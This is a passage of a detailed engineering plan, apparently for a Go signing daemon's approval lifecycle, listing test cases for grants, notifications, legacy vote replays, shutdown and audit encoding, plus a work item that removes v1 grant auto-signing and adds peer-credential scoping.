  - **grants (R3.5, F-4):** a grant record's Get returns `grant_id = request_id` and `grant_expires_at = decided_at + duration`, (r5.1) also after the grant record is shed; a grant-covered Submit is approved at submit and still needs a reason; revoking the grant before the first Claim makes that Claim answer `materialization_error{grant_not_live}`; a newer grant for the alias supersedes the older, and revoking the newer leaves neither live; a new epoch kills every grant; **(r5.1)** G2 (24 h) requested before G1 (1 h) for one alias, G1 approved after G2: G2 is dead; G1 expires and is shed under payload pressure, and separately G1 is revoked and deleted under count pressure: G2 stays dead in both, and a write G2 would cover gets a card; principal B's Submit is not covered by principal A's live grant;
  - **notification and assist coordination (R2.3), fake notifier and fake clock:** assist completes before the actor starts → one burst and one card already at revision 1, no edit; a burst lasting over 5 s while the assist deadline passes → no card I/O until every part is committed, then one card at revision 1; a part fails with a known 4xx while assist completes → `error`, no card, INCOMPLETE edits; (r5.1) a transport error on part 2, and separately on the card send, → decision `error` with INCOMPLETE edits, never `uncertain`; a full card-entry set when an edit is due → `error{notification_limit}`; `/renotify` with a full burst set is refused; (r5.4) a card the fake notifier delivers commits `msg_id` and `outcome = sent` in one commit, and Get then shows notification `sent`, never `sending`; `/renotify` while the actor's burst is in flight is refused, and a second `/renotify` before the new burst's append is inert (one new burst); assist completes while the card send is in flight → the card at revision 0, then one edit entry; the old challenge is refused as soon as the edit entry exists, and the new one only once it is confirmed; an edit answered "message is not modified" counts as confirmed; a known edit failure → one replacement card; **(r5.5, critique of the fold) in-epoch edit retry:** `EditCard` reports a possible send once and then succeeds, and no other command follows → the actor's retry confirms the edit within 2 s and an Approve tap then decides; possible sends for 70 s and then success → retries spaced about 1, 2, 4, 8, 16, 30 and 30 s apart, never two in flight, confirmation at the first success and no replacement card; with possible sends continuing, `/renotify` retires the edit entry, one burst and one replacement card follow, and the retries stop; a terminal decision stops them too;
  - `LegacyRequest`: first of tap and deadline with a fake clock; a tap after the deadline is answered "expired or already resolved" ((r5.5, critique of the fold), today's string, E8b), changes nothing and (r5.4) writes exactly one `legacy_vote_refused{expired}` audit line; ctx cancel resolves `timeout`; **(r5.4) replays audited (review 5 #6):** Approve then Approve again → one resolution, one signature set, the second tap answered "expired or already resolved" and audited `legacy_vote_replay{approve}`; Approve then Deny → the resolution stays approved, the Deny is answered "expired or already resolved" and audited `legacy_vote_replay{deny}`; two taps racing the `sync.Once` → one resolution and one `legacy_vote_replay` line for the loser, which is answered "expired or already resolved" and makes no card edit ((r5.5, critique of the fold), E8b's one deliberate change); a tap whose hash does not match → `legacy_vote_refused{stale_challenge}`; a tap after the tombstone is evicted, and one after a restart → `legacy_vote_refused{unknown_card}`; 40 taps on one tombstone → 32 lines, and the 8 dropped taps are reported by the next legacy line of another request, or with none, by one `legacy_audit_dropped{8}` line within 60 s; 40 stale-challenge taps on a still-live request → 32 lines and the same counter; an `AuditWriter` that fails changes no answer, resolution or v1 response; in every case the v1 response bytes and timeout equal the no-replay case; (r5.1) the card is sent only after its one assist attempt is terminal, with alignment `not_assessed`, and a stalled provider delays the card by at most the 5 s watchdog;
  - **(r5.8, review 9 #2) the stop is not a failure:** with a commit-counting store and a fake notifier that holds each call until released, `Close` is called while (a) part 2 of 3 is in flight, (b) the card send is in flight, (c) an `EditCard` is in flight, (d) an `EditStatus` is in flight, (e) the edit-retry timer is armed, (f) an assist call is in flight, and (g) a Flush write is in flight. The held call is then released, once returning a transport error and once returning success. In every case no commit follows the latch (the counter does not move), the fake records no further call (no INCOMPLETE edit, no status edit, no retry), the decision slot and every outcome are unchanged, and goleak is clean. The same transport error with no `Close` still gives decision `error` with INCOMPLETE edits (the contrast). (r5.8, critique of the fold) A second contrast pins the classification on the latch: with no `Close`, a fake notifier whose part 2 returns `context.DeadlineExceeded` (what a budget built as a context deadline returns), and separately `context.Canceled`, still gives decision `error` with INCOMPLETE edits (A8 pins the real adapter's 429 case). A Vote, a Claim and a Submit arriving after the latch answer `lifecycle_unavailable` and change nothing; (r5.8, critique of the fold) after the `Close`, a new `Lifecycle` over the same memory store runs Startup and shows exactly the crash cut at the latch (`uncertain` for (a) and (b), a superseding edit for (c), one status edit for (d), Clock's fill at `assist_deadline` for (f) with no second provider call, and a duplicate-safe re-flush for (g));
  - (r5.8, critique of the fold) **Startup:** at process start and after a restart over the same memory store, Startup builds the same projections, budget counter and unflushed list, mints a new epoch each time, kills every v2 grant, sends exactly one burst for a pending record with none and none for one with an `uncertain` burst; SA-11's crash-prefix recovery property passes through it with the last commit landed and not landed;
  - **(r5.8, review 9 #1) inert verdicts (E23):** an `AuditVerdict` with `Approval.transition` `vote_duplicate`, and one with `vote_refused{expired}`, ((r5.8, critique of the fold) each with `replay` set) encode as kind `verdict_inert` on `NewAppendOnlySink` and as status `approval-vote_duplicate` and `approval-vote_refused{expired}` on `AuditLog`; (r5.8, critique of the fold) so does one with `vote_replay` and `replay` set, and an `AuditVerdict` with `Approval` set but `replay` clear keeps kind `verdict`; an `AuditCall` with `Lifecycle = "approval-submitted"` and `Approval` encodes as kind `lifecycle` and as status `approval-submitted` with no `custody:` prefix; a verdict without `Approval` and a custody call keep today's bytes on both (one golden each), and `TestOrdinaryAuditEventJSONRemainsByteFrozen` stays green;
  - no non-claim view ever contains signatures; goleak after `Close`; `-race` hammers.
- **Ledger:** (r5.3) C-46, (r5.4) C-50, C-53 and C-54 (core), (r5.5) C-58 and C-59 (local engine), (r5.8) C-66 (encoding) and C-67 (engine), L2, L3, L4, L5 (await/poll), L7 (core), L9, R9, D-2, D-4, K6 gating, C-2 (local), C-10, C-11 (core), C-12 (limits and expiry), C-15, C-16, C-18, C-20, C-21, C-24, C-26 (local), C-28, C-29, (r5.1) C-35, C-36, (r5.2) C-39, C-45 (local).
- **Must not touch:** `daemon.go`, the `Backend` interface, `service.go`. Existing `AuditEvent` field order stays, and `service_test.go:211` stays green.
- **Accept:** STD (including `verify-lifecycle-closure`); FROZEN-LOCAL; `flock $LOCK go test -race -count=1 ./pkg/signerkit/lifecycle/...`; independent review (the engine and notifier).
- **Risk:** concurrency around the single writer. Every effect must be reachable only from a confirmed commit; the commit-counting wrapper and goleak are mandatory.

### A7 — Local daemon: v2 kinds, peer credentials, legacy adapter, grants

- **Depends:** A5, A6.
- **Owns:**
  - in `pkg/signerkit/`: `socket.go`; new `peercred_linux.go`, `peercred_darwin.go` and `peercred_other.go`; new `daemon_approvals.go` (the `legacyApprove` helper, the adapters for `AuditWriter`, `Minter`, `XferDigests` and `LegacyNotifier` plumbing, and the `revoke_grant`/`list_grants` reach into v2 grant records); `xferregistry.go` (`Snapshot` and digest, E34); `service.go`: **(r5.1) a late-binding seam**, `(*Service).ApprovalMinter()` (the daemon's `signAt` and `signTransferLegsAt`) and `(*Service).AttachApprovals(lc)`, called once before `Listen`; unattached means v2 kinds return `lifecycle_unavailable`; (r5.8, critique of the fold) and `(*Service).Close` (`service.go:136-144`): it first closes the attached lifecycle (A6's idempotent `Close`, §1.5 SA-8's owner stop), before today's `policyJournal == nil` early return, and then stops hosted policy recovery and closes the journal as today. Today's `Close` touches no lifecycle and returns nil at once when there is no policy journal, so without this hunk SIGTERM would never set the latch; its doc comment says the attached lifecycle is closed by it, and it stays safe to call more than once; r5's `Config.Approvals` passed to `New` was a construction cycle: the lifecycle's `Minter` needs the daemon that `New` builds;
  - `daemon.go`, **only these hunks**, each diff-reviewed by the orchestrator:
    1. the six new switch cases (E13);
    2. the four v1 call sites (`:608`, `:818`, `:1147`, `:1333`), which now call `d.legacyApprove` (E8b);
    3. the `revoke_grant` and `list_grants` handlers (`:896-906` and the list path) covering both sources (E24: revoke alias-global, list principal-scoped for v2 through the peer credential); (r5.1) v1 `matchGrant` is not taught about v2 grants, and (r5.2) hunk 5 removes it; the v1 `grant` struct is unchanged;
    4. `signAll` → `signAt` (`:1548-1565`), and `signTransferLegs` → `signTransferLegsAt` (`:1221-1222`) (E21);
    5. **(r5.2, OQ3 (b), owner ruling; its own named commit)** remove the v1 `sign` grant short-circuit (`:599-606`), so every v1 `sign` goes to `legacyApprove`; delete `matchGrant` (`:1427-1500`), which has no other caller, and (r5.2) `grantCovers` (`:1524-1542`), whose only caller is `matchGrant` (`:1492`); and update the comments that name them or describe grant auto-signing (`:121`, `:556-557`, `:582`, `:956`, and (r5.2) `isAdminVerb`'s `:1507-1509` and `isTransferVerb`'s `:1517`). The same stale wording in `src/mcp/tools/update_gate.go` (`:58`, `:75`, `:166`) is A13b's to fix, since A13b owns that file. `isAdminVerb` and `isTransferVerb` stay, for the lone-admin rule (`:592`), the transfer-verb refusal (`:559`) and E71's drift test. The v1 `grant` struct, `request_grant`, `revoke_grant` and `list_grants` are unchanged.
  - (r5.2) `src/signer/daemon_grant_test.go`, for the named OQ3 changes listed below and nothing else;
  - (r5.2) `src/signer/daemon_authmode_deny_test.go`, for `TestAuthMode_GrantUndelivered_StillGrant` only (named below); and comment-only edits in `pkg/signerkit/daemon_internal_test.go` (`:85-86`) and `pkg/signerkit/backend.go` (the `GrantApprovalRequest` doc comment, `:22-30`), which describe v1 grant auto-signing.
  - Not signer `main.go`: the production wiring is A8's.
- **Wire:** the six kinds dispatched as in E13; `PeerAwareHandler`, whose peer resolver is an unexported, injectable func (tests use it to simulate a second uid; production always uses the kernel credentials); legacy routing as in E8; v2 grant matching with E71's byte refusal outermost; the local `Minter` adapter, which re-runs `ValidateStepBytes` on the stored plan before `signAt` (E71).
- **Tests:**
  - socket-level v2 tests in which the peer uid is the test process's own; v2 kinds refused when there is no peer; unknown fields rejected;
  - **owner scope at the socket (R3.4):** a second uid, through the peer hook, gets byte-identical `not_found` for Get, Wait, List, Claim and Report on the first uid's full and shed records, and its Submit with the same `request_id` creates a separate record;
  - `signAll(now)` and `signAt(now)` produce byte-identical output, and so do `signTransferLegs` and `signTransferLegsAt(now)`, under a fixed clock;
  - **grants (E24, R3.5; r5.1):** a live v2 grant never auto-signs a v1 `sign`, with the grant's own fingerprint or any other (it prompts); **(r5.2, OQ3 (b))** a live host-less v1 grant (scope `all`, and separately scope `commands` with an exact match) never auto-signs a v1 `sign` either. The request reaches the backend (or the `LegacyRequest` in production), is approved or denied there, and the audit's `approved_by` is never `grant:`. The OQ3 cross-host case `{kind:sign, server:<granted alias>, host:<another registered fingerprint>}` prompts and, when denied, gets no signature. The v1 response for a prompted, approved `sign` is byte-identical to today's human-approved response under a fixed clock (the existing `TestGrant_ByteIdenticalToHumanApproved` fixture, now with both requests prompted). `request_grant`, `list_grants` and `revoke_grant` on a v1 grant keep today's bytes; a uid outside `allowed_uids` gets no auto-sign from any grant; uid B's v2 Submit gets no coverage from uid A's live grant; `revoke_grant` from either uid clears both sources and every v2 grant for the alias, and a grant-approved v2 request not yet claimed then answers `materialization_error{grant_not_live}`; `list_grants` lists the v1 map and only the caller's own live v2 grants, in today's response shape, so uid B never sees uid A's `grant_id`; (r5.2) a grant-decided v2 request whose Claim response write fails is still audited `decided_by grant:<G>`, and a repeat Claim returns the same set;
  - the policy path still sees `BaseManifestApprovalBackend` on `d.Backend` (no decorator);
  - **legacy routing (E8b) through a test `LegacyNotifier`:** the v1 response shape is unchanged; a fake clock expires the request at `ApprovalWindow` with v1 `timeout`; ctx cancel gives `timeout`; a tap before the deadline approves and signs at response time; a tap after it is answered "expired or already resolved" ((r5.5, critique of the fold)), changes nothing, signs nothing and (r5.4) writes one `legacy_vote_refused{expired}` audit line through the daemon's `AuditWriter` adapter; (r5.4) a second Approve and an opposite Deny after an Approve each write one `legacy_vote_replay` line and leave the v1 response byte-identical; the v1 audit is written after the response and a failing audit sink does not block it (today's fail-open behaviour);
  - the `MockBackend` path is unchanged;
  - a transfer whose registry entry rotates between Submit and the first Claim gives `materialization_error{stale_transfer_key}` and no signature;
  - the lone admin verb is checked at freeze;
  - **reserved verbs at the socket (E71):** v2 ports of `TestSignPath_RejectsTransferVerb` (an XFER step under every route, with a live scope=all v2 grant, gets `reserved_verb`, no signatures, no signed audit event, and (r5.4, SA-7) exactly one audit row for its `request_id` with status `error` and transition `refused{reserved_verb}`, asserted through `authModeFor` as today's test does) and `TestGrant_AdminVerbNeverAutoSigned` (`SSHGATE_UPDATE <hex>` and `SSHGATE_REVOKE` as `signed_admin` under a scope=all host-bound grant stay pending for a human, and `decided_by` is not `grant:`; a benign write on the same alias is still auto-approved `grant:<id>`); a corrupted stored plan with an XFER step is refused at the first Claim; the drift test: `approvalplan`'s prefixes equal `xferwire.VerbPrefix` and `"SSHGATE_"`, and agree with `isTransferVerb`/`isAdminVerb` over a corpus;
  - **(r5.4) refusals are audited (SA-7; critique of r5.4 C1-1):** at the socket, a v2 Submit refused `invalid_request`, `conflict`, `queue_full` and `submit_window_closed`, and a Get, Claim and Report answered `not_found`, each write exactly one audit row with status `error` and transition `refused{code}`; uid B's `not_found` on uid A's record and on an absent id give byte-identical rows apart from the timestamp; a failing audit writer changes no response bytes;
  - the report matrix through `approval_report_v2` with the tick running;
  - (r5.8, critique of the fold) **`Service.Close` stops the lifecycle:** a `Service` built with no policy journal and an attached lifecycle whose fake notifier holds a send: `Close` sets the latch (a later Vote answers `lifecycle_unavailable`), joins the actor, and returns only after the held call is released; a second `Close` returns nil; with a policy journal configured, the lifecycle is closed before the journal (a recording seam shows the order); an unattached `Service`'s `Close` is today's;
  - `go vet` passes for `GOOS=darwin`.
- **Named changes (r5.2, OQ3 (b)):** in `src/signer/daemon_grant_test.go`, the tests that pin v1 grant auto-signing are changed to assert a prompt: `TestGrant_ScopeAll_AutoSignsWithoutPrompt` (`:269`; renamed `TestGrant_V1GrantNeverAutoSigns`), `TestGrant_AuthModeOnSignResponseAndAudit` (`:315`; auth mode is the human's), `TestGrant_ScopeCommands_ExactMatchOnly` (`:365`), the benign-write half of `TestGrant_AdminVerbNeverAutoSigned` (`:456`), `TestGrant_CrossServer` (`:500`), `TestGrant_Expired` (`:521`), `TestGrant_Revoke` (`:650`) and `TestGrant_ByteIdenticalToHumanApproved` (`:704`). The commit message names the owner's OQ3 ruling. `TestGrant_RevealNeverAutoSigned`, the admin-verb half, the `TestListGrants_*` tests and the creation, validation and revoke-response tests stay unchanged and green. None of them is in FROZEN-LOCAL (`TestDaemon_`), and the socket and envelope goldens are untouched. **(r5.2)** Also `TestAuthMode_GrantUndelivered_StillGrant` (`src/signer/daemon_authmode_deny_test.go:135`). It creates a v1 grant and sends an *unarmed* v1 `sign` that "only the grant can resolve". With the short-circuit gone, that `sign` reaches `d.Backend.Request` on an unarmed `MockBackend` under `context.Background()` and blocks forever (`daemon.go:608-623`, `mock.go:66-78`), so `go test ./src/signer/...` would hang. It becomes `TestAuthMode_V1GrantUndelivered_IsHuman`: with a live v1 grant, the mock armed with an approval and the response write failing, the audit is `approved-undelivered` with `auth_mode` `human`, never `grant:`. The property it guarded, that a grant marker survives an approved-but-undelivered response, moves to the v2 grant test above. No other test outside `daemon_grant_test.go` depends on v1 grant auto-signing (grep; `daemon_transfer_test.go:295-323` is refused before the grant check and stays green).
